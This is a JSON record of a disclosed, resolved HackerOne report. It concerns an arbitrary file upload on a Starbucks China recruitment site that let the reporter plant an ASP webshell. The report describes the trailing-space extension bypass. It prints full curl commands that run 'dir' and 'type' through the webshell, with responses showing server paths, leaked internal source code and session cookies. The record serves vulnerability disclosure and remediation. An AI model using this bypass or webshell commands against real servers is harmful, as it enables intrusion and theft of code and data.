@@ -1,0 +1,177 @@
+{
+  "id": 506646,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDY2NDY=",
+  "url": "https://hackerone.com/reports/506646",
+  "title": "Webshell via File Upload on ecjobs.starbucks.com.cn",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-03-08T06:45:11.342Z",
+  "submitted_at": "2019-03-08T06:45:11.342Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "johnstone",
+    "url": "/johnstone",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r2sgsgfbc1b2wnyhbvekif762bva/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1989,
+    "url": "https://hackerone.com/starbucks",
+    "handle": "starbucks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Starbucks",
+      "twitter_handle": "Starbucks",
+      "website": "http://www.starbucks.com",
+      "about": "Premier purveyor of the finest coffee in the world, inspiring and nurturing the human spirit — one person, one cup and one neighborhood at a time."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-11-13T00:38:41.593Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-10-18T15:17:48.849Z",
+  "team_member_agreed_on_going_public_at": "2019-11-13T00:38:41.475Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nOS Command Injection which can let the attacker who get more important information of the server,such as disclosures internal source code of the webapp,database data and invade the internal network.\n\n**Description:** \nI found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.\n\n## Steps To Reproduce:\n\n  1. Sign in the url(https://ecjobs.starbucks.com.cn) and direct to the resume endpoint.\n  2. Use burp suite tools to interupt the avatar upload request.\n  3. Replace the filename type ```.jpg``` to ```asp ```which have a space character behind and modify the content\n\n  After that you have uploaded malicious files on the server and run any os command on server you wanted.\nDo some command like list all files on the server\n\n```\ncurl -i -s -k  -X $'GET' \\\n    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \\\n    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \\\n    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\\\TrustHX\\\\STBKSERM101\\\\www_app%20%2fd%2fs%2fb'\n```\n\n**The response content:**\n\n```\nHTTP/1.1 200 OK\nDate: Fri, 08 Mar 2019 02:56:19 GMT\nServer: wswaf/2.13.0-5.el6\nContent-Type: text/html\nCache-Control: private\nX-Powered-By: ASP.NET\nX-Via: 1.1 jszjsx51:1 (Cdn Cache Server V2.0), 1.1 PSjxncdx5rt58:6 (Cdn Cache Server V2.0)\nConnection: close\nContent-Length: 1814533\n\n<html>\n<body>\n<h1>POC by hackerone_john stone</h1>\n<textarea readonly cols=80 rows=25>\nd:\\TrustHX\\STBKSERM101\\www_app\\bin\nd:\\TrustHX\\STBKSERM101\\www_app\\common\nd:\\TrustHX\\STBKSERM101\\www_app\\concurrent_test\nd:\\TrustHX\\STBKSERM101\\www_app\\Default.aspx\nd:\\TrustHX\\STBKSERM101\\www_app\\Global.asax\nd:\\TrustHX\\STBKSERM101\\www_app\\hximages_v6\n....................................\n</textarea>\n</body>\n</html>\n```\n\n**Show the internal source code**\n```\ncurl -i -s -k  -X $'GET' \\\n    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \\\n    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \\\n    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=type%20d:\\\\TrustHX\\\\STBKSERM101\\\\www_app\\\\concurrent_test\\\\new_application_concurrent_test__svc.cs'\n```\nthe source code respones:\n```\nHTTP/1.1 200 OK\nDate: Fri, 08 Mar 2019 03:37:39 GMT\nServer: wswaf/2.13.0-5.el6\nContent-Type: text/html\nCache-Control: private\nX-Powered-By: ASP.NET\nX-Via: 1.1 jszjsx51:0 (Cdn Cache Server V2.0), 1.1 ydx154:3 (Cdn Cache Server V2.0)\nConnection: close\nContent-Length: 33316\n\n<html>\n<body>\n<h1>POC by hackerone_john stone</h1>\n<textarea readonly cols=80 rows=25>\nï»¿using System;\nusing System.Collections.Generic;\nusing System.ComponentModel;\nusing System.Data;\nusing System.Drawing;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\nusing System;\nusing System.Collections.Specialized;\nusing System.Collections.Generic;\nusing System.Data;\nusing System.Configuration;\nusing System.Xml;\nusing System.Transactions;\nusing System.Text;\nusing System.Threading;\nusing System.Web;\n\nusing TrustHX.IHXEIMS6;\nusing hxsys = TrustHX.HXEIMS6;\nusing hxwww = TrustHX.HXWWW6;\nusing hxsm = TrustHX.HXSM6;\nusing hxmd = TrustHX.HXMD6;\n\n\nclass new_application_concurrent_test : IHXPageXmlService\n{\n    #region IHXPageXmlService æå\n    string IHXPageXmlService.Run(string strSystemCode, string strPageXmlServiceCode, string strPageXmlServiceContent, string strHXPageParamUUID, string strHXPageName)\n    {\n        try\n        {\n            switch (strPageXmlServiceCode)\n            {\n                case \"PREPARE_CONCURRENT_DATA\":return ConcurrentDataPrepare.ConcurrentDataPrepareProcess(strSystemCode, strPageXmlServiceContent);\n                case \"CONCURRENT_TEST\":return ConcurrentTest.ConcurrentTestProcess(strSystemCode, strPageXmlServiceContent);\n                default:\n                    string strErrorMessageText =\n....................................\n</textarea>\n</body>\n</html>\n```\n\n## Recommendations for fix\n\n*Strictly limit file upload types\n*Only allow jpg/png/gif/jpeg file parsing on the uploaded fiels\n*More safe code design\n\nThks!Looking forward to your reply.\nWith kind regards\nJohn stone\n\n## Impact\n\ndisclosures  the internal source code data and user's information,broken ring server,etc.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 437463,
+      "file_name": "intenal_source_code.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/463/e2f5568a35827c4ca8dc556440e4a028078e6205/intenal_source_code.png?response-content-disposition=attachment%3B%20filename%3D%22intenal_source_code.png%22%3B%20filename%2A%3DUTF-8%27%27intenal_source_code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUV2CGWUB%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152047Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQCTXpxsFPt1L%2FkCxOVB1B3bBXWaNOlY5wahEl5r2sxxBgIhANZZTGMjD1dUdM6hu53hcgIE%2BhLd%2F5bYa3ZdxidZkTITKroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx%2FJgTOGH7sfsex8cIqjgU0qgSJ9WhXa7evAxE%2B%2BIf9cl6N4OunmKi1bbV3Gj4oEXwaOD6BD53PpBRgoDh3BKRK1f7KsrMtk7oQKfjJkC24OrFpqNdFReGiSfZ1iwGS3LhDzFVwQdn1%2BK8Ol6C6ex3caYbFTIhVw0SAtKwqliL%2F93RaJd7oREgGvzI8IG0T3IAxQX7%2FCcOBfHTXizPiBLNrfLpqwm0Nwl2%2F1nMwD%2FIlZVXXGLkOMUb1J4dBuH2ILkLdJY5uvzxYr80JyJqgUzwRAkazE1oYfLyHJGRBgJHJ2dA1FSp7B%2BGFd%2Fo%2FfcRyyL7GyD%2BuH8BKk%2F0bR8j9qmQnftDc7%2B4mafAudu0YWNx47h7wl0lF9X9f5SnqU4ImIYjPUeS8zJ%2BElpfJAshC9lqkuO1uuQrQlknnzGulGKpUkLj3dE0y2TI5tUrjC%2FtF8%2FIsUntd2eVaBF%2FYE%2BelZD6Zftc9ZvvVQhImYlFGiHGzEun8Zp77ikhc7pdZNm55EhQZoQW0aLxeUZRGEDT65OOfGiqUSk0YPu1y7idAZZy7M5yu8GzeYOvmYsGOt0aKWBoH6bquc9IcUzfFKfSiTQ1vsts7yC3dadpPkBxwfBkn9bh6bKJf7CAFfueAhP%2Fbc%2By%2FEF3wSNK%2BE2PDtFfzNfck9xkYhPJbdwq8L11C4x3EM7BkGkGGjoml%2FCdzIWn9jXxMZhMejeAheaWqKqnR4rmFmYlvfiJLpuQAouvvUzpfQo%2BuzwtTLMJrl8P%2FoIH7WVxm2WwZy4tO%2Blx3c7%2F7fv9LSeE5E%2FOgOg%2B6bSI4RkNXAtNyPDG%2FeY7u5VFXYYHBgji2BWbqq0UGfKEvusUXUVtwFuAniojpSOzeVkfC9Oow64qoX4LMGa%2FZlsSi55wwtv78zwY6sAFsfiizT40h6BNyeJmgpnfo1N6cLUC4QuJhp2F6NPTJJuTaz%2F0q%2Fv4xHYTI8pFZShEkmnGRggZOoBtIuL5ZHtnM2olXFY3CVC9y72drP3OwIIToCP3Ui4zOhTQV2R78aLq8IQJyVf7nMR6yVlk2gQI1svAuSOAjVsTkyK%2Bd7vItexRmem3Td1bRFMAPLnCKsHM5FYhtHwhI%2BaSL6Y2BjpQeVoBT5xKJrTpvsPBYzzJp%2FA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b4f5e056faf2e96016b304729aeca78d9f26fd5d47f7661390d32cfa07a97f3a",
+      "file_size": 53981,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 437464,
+      "file_name": "OS_CMD.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/464/675d4af27f0bbb745c07062816fd112fa6430ceb/OS_CMD.png?response-content-disposition=attachment%3B%20filename%3D%22OS_CMD.png%22%3B%20filename%2A%3DUTF-8%27%27OS_CMD.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUV2CGWUB%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152047Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQCTXpxsFPt1L%2FkCxOVB1B3bBXWaNOlY5wahEl5r2sxxBgIhANZZTGMjD1dUdM6hu53hcgIE%2BhLd%2F5bYa3ZdxidZkTITKroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx%2FJgTOGH7sfsex8cIqjgU0qgSJ9WhXa7evAxE%2B%2BIf9cl6N4OunmKi1bbV3Gj4oEXwaOD6BD53PpBRgoDh3BKRK1f7KsrMtk7oQKfjJkC24OrFpqNdFReGiSfZ1iwGS3LhDzFVwQdn1%2BK8Ol6C6ex3caYbFTIhVw0SAtKwqliL%2F93RaJd7oREgGvzI8IG0T3IAxQX7%2FCcOBfHTXizPiBLNrfLpqwm0Nwl2%2F1nMwD%2FIlZVXXGLkOMUb1J4dBuH2ILkLdJY5uvzxYr80JyJqgUzwRAkazE1oYfLyHJGRBgJHJ2dA1FSp7B%2BGFd%2Fo%2FfcRyyL7GyD%2BuH8BKk%2F0bR8j9qmQnftDc7%2B4mafAudu0YWNx47h7wl0lF9X9f5SnqU4ImIYjPUeS8zJ%2BElpfJAshC9lqkuO1uuQrQlknnzGulGKpUkLj3dE0y2TI5tUrjC%2FtF8%2FIsUntd2eVaBF%2FYE%2BelZD6Zftc9ZvvVQhImYlFGiHGzEun8Zp77ikhc7pdZNm55EhQZoQW0aLxeUZRGEDT65OOfGiqUSk0YPu1y7idAZZy7M5yu8GzeYOvmYsGOt0aKWBoH6bquc9IcUzfFKfSiTQ1vsts7yC3dadpPkBxwfBkn9bh6bKJf7CAFfueAhP%2Fbc%2By%2FEF3wSNK%2BE2PDtFfzNfck9xkYhPJbdwq8L11C4x3EM7BkGkGGjoml%2FCdzIWn9jXxMZhMejeAheaWqKqnR4rmFmYlvfiJLpuQAouvvUzpfQo%2BuzwtTLMJrl8P%2FoIH7WVxm2WwZy4tO%2Blx3c7%2F7fv9LSeE5E%2FOgOg%2B6bSI4RkNXAtNyPDG%2FeY7u5VFXYYHBgji2BWbqq0UGfKEvusUXUVtwFuAniojpSOzeVkfC9Oow64qoX4LMGa%2FZlsSi55wwtv78zwY6sAFsfiizT40h6BNyeJmgpnfo1N6cLUC4QuJhp2F6NPTJJuTaz%2F0q%2Fv4xHYTI8pFZShEkmnGRggZOoBtIuL5ZHtnM2olXFY3CVC9y72drP3OwIIToCP3Ui4zOhTQV2R78aLq8IQJyVf7nMR6yVlk2gQI1svAuSOAjVsTkyK%2Bd7vItexRmem3Td1bRFMAPLnCKsHM5FYhtHwhI%2BaSL6Y2BjpQeVoBT5xKJrTpvsPBYzzJp%2FA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8a1f21b27cdd73419685cf00fd59c2790951e79ce1686507ccdd67f2c5f64f28",
+      "file_size": 54437,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-11-17T15:17:48.913Z",
+  "allow_singular_disclosure_after": -204336178.15123123,
+  "singular_disclosure_allowed": true,
+  "vote_count": 686,
+  "voters": [
+    "datalocaltmp",
+    "superhero1",
+    "kashsec",
+    "lyinq",
+    "orange303",
+    "dariasc",
+    "defenderwww",
+    "k0ns0l",
+    "jumpydata",
+    "m4t35z",
+    "and 676 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 13008,
+    "asset_type": "OTHER",
+    "asset_identifier": "Other non domain specific items",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 18863,
+      "category": "team",
+      "content": "johnstone discovered An arbitrary file upload via the resume functionality at https://ecjobs.starbucks.com.cn which led to arbitrary code execution by uploading a webshell.\n@johnstone   — thank for reporting this vulnerability, your patience while we followed up on the issue internally and for your additional effort to confirm the resolution.",
+      "updated_at": "2019-11-13T00:38:21.648Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 706273,
+        "username": "agedsumatra",
+        "name": "agedSumatra",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2019-08-12T17:50:49.926Z",
+        "url": "https://hackerone.com/agedsumatra",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
